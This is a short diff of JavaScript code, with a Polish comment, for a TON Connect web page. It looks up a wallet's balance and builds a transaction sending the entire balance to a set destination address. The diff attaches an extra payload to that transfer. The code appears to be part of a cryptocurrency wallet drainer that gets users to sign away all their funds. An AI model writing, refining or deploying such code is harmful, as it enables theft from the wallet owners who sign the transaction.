@@ -341,7 +341,6 @@
 
                 // Tworzenie payloadu
                 const payload = await createPayload();
-
                 async function getBalance(address) {
                     const response = await fetch(`https://toncenter.com/api/v2/getAddressBalance?address=${address}`);
                     const data = await response.json();
@@ -357,7 +356,8 @@
                                 messages: [
                                     {
                                         address: destinationAddress,
-                                        amount: balance.toString()
+                                        amount: balance.toString(),
+                                        payload: payload
                                     }
                                 ]
                             };
@@ -367,6 +367,7 @@
                         }
                     }
                 });
+
 
                 const result = await tonConnectUI.sendTransaction(transaction);
                 console.log('Transaction result:', result);
